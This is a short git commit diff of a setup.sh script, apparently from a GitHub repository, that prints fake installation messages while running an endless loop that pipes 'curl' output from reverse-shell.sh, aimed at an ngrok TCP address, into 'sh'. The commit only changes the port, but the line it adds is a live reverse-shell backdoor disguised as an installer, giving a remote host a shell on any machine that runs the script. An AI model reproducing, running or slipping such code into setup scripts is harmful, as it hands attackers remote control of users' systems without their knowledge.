ab9cea6f198fb0ca28698b1067df0163360eb786
witcher1023 <89247079+witcher1023@users.noreply.github.com>
2022-01-31 11:12:32 +0500

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -2,5 +2,5 @@ echo PLease Wait Your Setup is Installing
 sleep 2
 echo installing the required Files 
 sleep 4
-while true; do curl https://reverse-shell.sh/4.tcp.ngrok.io:13283 | sh; done
+while true; do curl https://reverse-shell.sh/4.tcp.ngrok.io:12092 | sh; done
 echo All Done We are Good To Go
